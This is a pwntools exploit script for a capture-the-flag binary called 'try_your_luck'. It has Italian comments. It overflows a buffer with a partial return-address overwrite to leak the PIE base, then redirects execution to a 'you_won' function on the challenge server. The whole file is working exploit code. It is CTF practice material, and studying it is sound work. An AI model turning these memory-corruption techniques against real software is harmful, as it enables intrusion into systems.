#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('try_your_luck')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("yourluck.challs.cyberchallenge.it", 6013, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
br game
continue
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

#Idea: pivot di main dato che PIE non cambia del tutto gli indirizzi ma solo la prima parte

io = start()

str_test = "01234567"*5

#It would be simpler to put the last byte to 0x42 (start of main), unfortunately this fucks up the alignment of the stack needed to call a libc function
io.send(str_test + chr(0x64)) #Sovrascrivi l'ultimo byte dell'indirizzo di ritorno per ripartire da main
io.recvuntil(str_test)
main_addr = io.recvuntil("...", True)
print("%x"%int.from_bytes(main_addr, "little"))

diff_exe_addr = exe.address - (exe.sym.main + 34) #L'indirizzo di main e' gia' traslato

exe.address = int.from_bytes(main_addr, "little") + diff_exe_addr

vector = b"01234567"*5

R = ROP(exe)
R.call("you_won", [])

print("%x"%exe.sym.you_won)
io.send(vector + p64(exe.sym.you_won))

io.interactive()

